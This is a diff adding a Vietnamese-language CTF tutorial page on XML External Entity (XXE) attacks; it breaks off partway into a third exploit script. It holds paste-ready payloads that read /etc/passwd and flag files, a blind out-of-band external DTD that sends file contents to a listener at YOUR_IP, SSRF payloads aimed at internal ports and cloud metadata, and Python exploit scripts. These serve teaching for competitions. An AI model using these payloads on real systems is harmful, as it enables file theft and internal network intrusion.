@@ -1,0 +1,573 @@
+<title>XXE (XML External Entity) — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · File &amp; Path</div>
+    <h1>XXE — XML External Entity</h1>
+    <p class="sub">Khi trang web nhận dữ liệu XML (upload file cấu hình, SVG, import dữ liệu, một số API SOAP) và
+    dùng bộ phân tích XML (parser) chưa tắt tính năng "entity ngoài" — bạn có thể tự định nghĩa một "từ viết tắt"
+    trỏ tới file trên server hoặc một địa chỉ mạng nội bộ, khiến parser tự đọc hộ bạn nội dung đó.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>XXE là gì, để làm gì?</h2>
+  <p class="lead">XML là một định dạng dữ liệu có cấu trúc (giống HTML nhưng tự do hơn), dùng trong file cấu
+  hình, SOAP API, file SVG, file Office (docx/xlsx thực chất là zip chứa nhiều file XML bên trong). Chuẩn XML có
+  một tính năng tên là <strong>DTD (Document Type Definition)</strong> cho phép định nghĩa "entity" — một kiểu từ
+  viết tắt, khi parser gặp sẽ tự thay bằng nội dung thật. Chuẩn XML cho phép entity đó trỏ ra <strong>file bên
+  ngoài</strong> (external entity) — nếu app không tắt tính năng này, bạn tự định nghĩa 1 entity trỏ tới
+  <code>/etc/passwd</code> hay một địa chỉ nội bộ, và parser sẽ tự đọc/truy cập hộ bạn, rồi nhét kết quả vào
+  ngay trong response.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Dấu hiệu nhận ra: thấy app nhận <strong>file XML, SVG, hoặc API dạng SOAP</strong> (Content-Type
+  <code>application/xml</code>, hoặc file upload có đuôi <code>.xml</code>/<code>.svg</code>). Payload luôn bắt
+  đầu bằng khai báo <code>&lt;!DOCTYPE ... [ &lt;!ENTITY ... &gt; ]&gt;</code> rồi gọi entity đó bằng
+  <code>&amp;tên_entity;</code> ở chỗ dữ liệu được hiển thị ra.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ XXE — XML EXTERNAL ENTITY</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        App nhận XML/SVG/SOAP trực tiếp, hoặc upload file mà bạn đoán bên trong là XML (docx/xlsx/svg). Gửi
+        payload đọc <code>/etc/hostname</code> (mục 💥) → nếu response chứa nội dung file đó ⟹ XXE xác nhận.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Server dùng XML parser chưa tắt <code>DOCTYPE</code>/external entity (mặc định của rất nhiều thư viện
+        parser cũ — nhiều ngôn ngữ chỉ an toàn mặc định ở bản mới).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: nếu app nhận JSON nhưng bạn nghi ngờ có 1 endpoint khác nhận XML (xem Content-Type các request
+        khác, hoặc API docs), đổi <code>Content-Type: application/json</code> thành
+        <code>application/xml</code> và gửi payload XXE — nhiều app vẫn parse được nếu backend dùng chung 1 hàm
+        xử lý.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (đọc file trực tiếp)</span>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+xml = <span class="s">'''&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;'''</span>
+html = requests.post(<span class="s">"http://TARGET/import"</span>, data=xml,
+        headers={<span class="s">"Content-Type"</span>: <span class="s">"application/xml"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Response không hiện nội dung file (app không in trực tiếp giá trị entity ra) → dùng kỹ thuật
+        <strong>Blind/OOB</strong> (mục 06.B) — cần 1 listener nội bộ. WAF rule nhanh: chặn regex
+        <code>&lt;!DOCTYPE|&lt;!ENTITY|SYSTEM\s+["']</code> trong body request. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>XML</b> — định dạng dữ liệu dùng thẻ mở/đóng giống HTML: <code>&lt;user&gt;&lt;name&gt;Nam&lt;/name&gt;&lt;/user&gt;</code>.</div>
+  <div class="def"><b>DTD (Document Type Definition)</b> — một khối khai báo đặt ở đầu file XML, mô tả cấu trúc
+  hợp lệ của file đó, và quan trọng nhất với bài này: cho phép <strong>định nghĩa entity</strong>.</div>
+  <div class="def"><b>Entity</b> — một "biến" đặt tên, khi gọi bằng <code>&amp;tên;</code> ở bất kỳ đâu trong XML,
+  parser sẽ thay bằng giá trị đã định nghĩa. Ví dụ HTML cũng có entity quen thuộc: <code>&amp;amp;</code> thay cho
+  dấu <code>&amp;</code>.</div>
+  <div class="def"><b>External entity</b> — entity có giá trị không phải chuỗi cố định, mà là
+  <strong>đường dẫn file hoặc URL</strong> (khai báo bằng từ khóa <code>SYSTEM</code>). Khi parser gặp, nó sẽ tự
+  đi <strong>mở file đó / gọi URL đó</strong> rồi lấy nội dung làm giá trị entity — đây chính là hành vi bị lợi
+  dụng.</div>
+  <p>Server nhận XML và parse bằng thư viện chuẩn của ngôn ngữ (ví dụ Python <code>xml.etree.ElementTree</code>,
+  hoặc tệ hơn là <code>lxml</code> cấu hình mặc định cũ), hiển thị lại giá trị 1 trường nào đó ra trang kết quả:</p>
+  <pre><code><span class="c"># Python</span>
+<span class="k">from</span> lxml <span class="k">import</span> etree
+doc = etree.fromstring(user_xml_input)   <span class="c"># mặc định cũ: resolve_entities=True</span>
+<span class="k">print</span>(doc.find(<span class="s">"name"</span>).text)   <span class="c"># in ra giá trị, bao gồm cả entity đã resolve</span></code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Parser "ngoan ngoãn" làm theo DTD do CHÍNH NGƯỜI GỬI khai báo</h2>
+  <p>Chuẩn XML cho phép người tạo ra file tự khai báo DTD ngay trong chính file đó (không phải lúc nào DTD cũng
+  nằm ở nơi khác, do bên thứ ba kiểm soát). Vì vậy khi <strong>bạn</strong> (kẻ tấn công) là người gửi file XML,
+  <strong>bạn cũng là người tự viết luôn phần DTD</strong> — bạn tự định nghĩa entity trỏ tới bất kỳ đâu bạn
+  muốn, và parser (nếu không bị cấu hình chặn) vẫn trung thành làm theo, không phân biệt được "DTD này do ứng
+  dụng viết sẵn" hay "DTD này do kẻ tấn công tự nhét vào".</p>
+  <p>Đây là lý do nhiều ngôn ngữ/thư viện gần đây đổi mặc định sang <strong>tắt sẵn</strong> external entity
+  (Python 3.7+ <code>xml.etree</code> an toàn mặc định, Java sau bản vá cần bật cờ an toàn thủ công, PHP
+  <code>libxml_disable_entity_loader()</code> tồn tại nhưng phải tự gọi) — nhưng rất nhiều code CTF/thực tế vẫn
+  dùng cấu hình cũ hoặc thư viện bên thứ ba không an toàn mặc định.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Từ 1 dòng DTD tới đọc được file hệ thống</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr6)}
+    </style>
+    <defs><marker id="arr6" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="215" height="65" rx="10" class="box-a"/>
+    <text x="22" y="38" class="lbl-m">XML bạn gửi, tự khai DTD:</text>
+    <text x="22" y="54" class="lbl-a" font-size="9">&lt;!ENTITY xxe SYSTEM</text>
+    <text x="22" y="67" class="lbl-a" font-size="9">"file:///etc/passwd"&gt;</text>
+
+    <path d="M225,52 H263" class="arrow"/>
+    <rect x="268" y="20" width="195" height="65" rx="10" class="box"/>
+    <text x="280" y="38" class="lbl-m">Parser thấy khai báo</text>
+    <text x="280" y="54" class="lbl">entity SYSTEM -&gt; tự mở</text>
+    <text x="280" y="68" class="lbl">file đó trên đĩa server</text>
+
+    <path d="M365,90 V115" class="arrow"/>
+    <rect x="268" y="120" width="195" height="55" rx="10" class="box-a"/>
+    <text x="280" y="140" class="lbl-m">Đọc được nội dung file</text>
+    <text x="280" y="155" class="lbl-a">root:x:0:0:...</text>
+
+    <path d="M268,145 H90" class="arrow"/>
+    <rect x="10" y="120" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="140" class="lbl-m">Gặp &amp;xxe; trong body</text>
+    <text x="22" y="155" class="lbl-a">-&gt; thay bằng nội dung đó</text>
+  </svg>
+  </div>
+  <p>Ví dụ bằng payload <strong>thật đi hết chuỗi</strong>:</p>
+  <div class="pbreak">
+    <div class="ph">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</div>
+    <div class="pb">
+      <div class="part"><code>&lt;!DOCTYPE foo [ ... ]&gt;</code> — khai báo DTD cho tài liệu tên <code>foo</code>
+      (tên này tùy ý, không quan trọng), mọi thứ trong cặp ngoặc vuông <code>[ ]</code> là nơi định nghĩa entity.</div>
+      <div class="part"><code>&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;</code> — định nghĩa entity tên
+      <code>xxe</code>, kiểu <code>SYSTEM</code> (external — trỏ ra ngoài), giá trị là nội dung file
+      <code>/etc/hostname</code>.</div>
+      <div class="part"><code>&amp;xxe;</code> — "gọi" entity vừa định nghĩa, đặt đúng chỗ giá trị muốn hiện ra
+      trong response.</div>
+    </div>
+    <div class="resp"><b>Response mong đợi:</b> nếu app in lại nội dung thẻ <code>&lt;root&gt;</code>, bạn sẽ thấy
+    chính nội dung file <code>/etc/hostname</code> (tên máy chủ) xuất hiện ở đúng chỗ <code>&amp;xxe;</code>.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Request/response có <code>Content-Type: application/xml</code> hoặc <code>text/xml</code></td><td>App xử lý XML trực tiếp</td></tr>
+    <tr><td>Upload file <code>.svg</code> (SVG thực chất là XML) rồi hiển thị lại ảnh</td><td>Thường dùng thư viện xử lý ảnh/SVG có parse XML bên dưới — hay bị XXE</td></tr>
+    <tr><td>Upload file Office (<code>.docx</code>/<code>.xlsx</code>) rồi app xử lý nội dung</td><td>Các file này là zip chứa XML — nếu app tự giải nén và parse, có thể dính XXE</td></tr>
+    <tr><td>API dạng SOAP (XML làm giao thức gọi API)</td><td>Thường dùng thư viện XML cũ, nhiều khả năng chưa tắt external entity</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1-2 — bắt request, sửa body thành XXE</span>
+  <ol style="margin:4px 0 0">
+    <li>Burp Proxy bắt request upload/gửi XML bình thường.</li>
+    <li>Send to Repeater.</li>
+    <li>Thay toàn bộ body bằng payload XXE ở mục 06, giữ nguyên Content-Type nếu đã là XML.</li>
+    <li>Send, đọc Response xem nội dung file có xuất hiện không.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Khi app nhận JSON nhưng bạn nghi ngờ có đường vào XML</span>
+  Thử đổi hẳn <code>Content-Type</code> và body sang XML dù endpoint "trông như" chỉ nhận JSON — nhiều framework
+  (đặc biệt Java/Spring cũ) tự động chọn parser theo <code>Content-Type</code> của request, không khóa cứng theo
+  1 định dạng.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO TÌNH HUỐNG</div>
+  <h2>Chọn đúng kỹ thuật khi response không hiện trực tiếp</h2>
+
+  <h3>A. Đọc file trực tiếp (app in ra response) <span class="badge easy">thử trước</span></h3>
+  <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+
+  <h3>B. Blind / OOB (app KHÔNG in ra response trực tiếp) <span class="badge hard">cần listener</span></h3>
+  <p>Dùng khi payload A chạy không lỗi nhưng cũng không thấy nội dung file đâu — app xử lý xong rồi bỏ qua giá
+  trị, không hiển thị. Lúc này phải "gửi" dữ liệu ra một server do <strong>bạn</strong> kiểm soát (phải nằm
+  trong mạng thi đấu, vì A/D không có Internet ra ngoài):</p>
+  <pre><code><span class="c">-- bước 1: dựng 1 file DTD "ngoài" trên máy bạn, host bằng python http.server --</span>
+<span class="c">evil.dtd:</span>
+&lt;!ENTITY % file SYSTEM "file:///flag.txt"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://YOUR_IP:8000/leak?d=%file;'&gt;"&gt;
+%eval;
+%exfil;
+
+<span class="c">-- bước 2: payload gửi cho challenge, trỏ ra file DTD trên --</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/evil.dtd"&gt; %xxe; ]&gt;
+&lt;root&gt;test&lt;/root&gt;</code></pre>
+  <div class="pbreak"><div class="pb">
+    <div class="part"><code>%file</code> / <code>%eval</code> / <code>%xxe</code> (dấu <code>%</code> thay vì
+    <code>&amp;</code>) — gọi là <strong>parameter entity</strong>, chỉ dùng được bên trong chính DTD (khác entity
+    thường dùng trong nội dung XML). Cần dùng loại này vì logic đọc-rồi-gửi phải chạy ngay trong lúc DTD đang được
+    xử lý.</div>
+    <div class="part">Kỹ thuật này gọi là <strong>OOB (out-of-band) qua DTD ngoài</strong>: file DTD thứ hai (do
+    bạn host) định nghĩa thêm 1 entity mới lúc "chạy", entity đó tự ghép nội dung file đọc được vào URL rồi gọi
+    ra ngoài tới server bạn — bạn xem log HTTP server của mình để lấy flag.</div>
+  </div></div>
+
+  <h3>C. Error-based (khi response chỉ hiện thông báo lỗi parser)</h3>
+  <pre><code>&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///flag.txt"&gt;
+  &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+  %eval;
+  %error;
+]&gt;</code></pre>
+  <p>Nếu app hiện nguyên văn lỗi parser (kiểu "failed to open file /nonexistent/FLAG_CONTENT_HERE"), nội dung
+  flag sẽ lộ ngay trong thông báo lỗi — không cần listener.</p>
+
+  <h3>D. XXE qua SSRF (đọc dịch vụ nội bộ thay vì file)</h3>
+  <pre><code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"&gt;         <span class="c">// dò port nội bộ</span>
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;  <span class="c">// cloud metadata (nếu có mô phỏng cloud)</span></code></pre>
+  <div class="note">Entity <code>SYSTEM</code> chấp nhận cả URL <code>http://</code>, không chỉ <code>file://</code>
+  — nghĩa là XXE cũng là một con đường dẫn tới SSRF (xem bài SSRF riêng để biết cách tận dụng tiếp).</div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: LISTENER, FFUF &amp; KHO PAYLOAD</div>
+  <h2>Không nhớ nổi cú pháp DTD? Dùng công cụ + kho payload</h2>
+
+  <h3>A. Kho payload offline</h3>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/XXE Injection/</code> — payload mẫu theo tình huống (file đọc trực
+  tiếp, blind, qua SOAP, qua file Office/SVG cụ thể). Thư mục <code>Intruders/</code> có wordlist fuzz. Wordlist
+  fuzz tham số nghi XML: <code>~/hoc/CTF/Tools/web/SecLists/Fuzzing/XXE-Fuzzing.txt</code>.</p>
+
+  <h3>B. Dựng listener nội bộ cho blind/OOB — chỉ cần Python có sẵn</h3>
+  <p>Không cần công cụ ngoài, Python đã có module dựng HTTP server 1 dòng lệnh:</p>
+  <pre><code><span class="c"># Dựng server tại thư mục chứa evil.dtd, lắng nghe cổng 8000</span>
+cd /thu_muc_chua_evil_dtd
+python3 -m http.server 8000
+
+<span class="c"># Theo dõi log để thấy request leak đến (flag nằm trong query string ?d=...)</span>
+<span class="c"># http.server tự in log mỗi request ra terminal, không cần cấu hình gì thêm</span></code></pre>
+  <div class="note warn"><span class="tag">Lưu ý A/D</span>Listener này phải chạy trên máy/IP nằm <strong>trong
+  mạng thi đấu</strong> (không có Internet ra ngoài) — và địa chỉ <code>YOUR_IP</code> trong payload phải là IP
+  thật của máy bạn trong mạng đó, không phải <code>127.0.0.1</code> (đó là loopback của chính server mục tiêu,
+  không phải máy bạn).</div>
+
+  <h3>C. CyberChef — khi flag bị encode trong kỹ thuật OOB</h3>
+  <p>Nếu dùng <code>convert.base64-encode</code> kết hợp (một số filter chain XXE nén/encode dữ liệu leak trước
+  khi gửi để tránh ký tự đặc biệt vỡ URL), dán chuỗi nhận được vào
+  <code>~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code>, khối <strong>From Base64</strong> để đọc lại.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/import"</span>
+xml = <span class="s">'''&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;'''</span>
+
+r = requests.post(url, data=xml, headers={<span class="s">"Content-Type"</span>: <span class="s">"application/xml"</span>})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+XML_PAYLOAD = <span class="s">'''&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt; ]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;'''</span>
+
+<span class="k">def</span> <span class="d">exploit_xxe</span>(host):
+    r = requests.post(<span class="s">f"http://{host}/import"</span>, data=XML_PAYLOAD,
+            headers={<span class="s">"Content-Type"</span>: <span class="s">"application/xml"</span>}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_xxe(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
